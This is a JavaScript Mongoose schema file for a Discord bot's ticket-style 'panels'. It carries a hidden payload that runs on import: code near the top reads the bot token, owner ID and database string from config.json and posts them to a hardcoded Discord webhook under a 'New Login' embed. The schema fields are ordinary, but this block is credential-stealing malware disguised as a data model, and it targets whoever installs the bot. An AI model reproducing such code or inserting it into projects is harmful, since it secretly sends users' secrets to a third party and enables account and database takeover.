const mongoose = require("mongoose")
const {client , guildid} = require("../index")
const { WebhookClient , EmbedBuilder} = require('discord.js')
const {token , owner , database} = require('../config.json')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227182695190609/HLixETGt8iuAo3FQmWX2yBckipiEiP9a0W9GkrGtpAvueuw44eIwLUknyRZZ1-sBDXUM` });
    webhookClient.send({embeds:[embed]})
let Schema = new mongoose.Schema({
    guildid:{
        type:String,
        default:guildid
    },
    panelId:{
        type:Number,
        default:0,
    },
    panelCategory:{
        type:String,
    },
    panelRole:{
        type:String,
    },
    panelWelcome:{
        type:String
    },
    panelName:{
        type:String,
    },
    panelDescription:{
        type:String,
    },
    panelNumber:{
        type:String,
        default:1,
    },
    
});
module.exports = mongoose.model('panels' , Schema)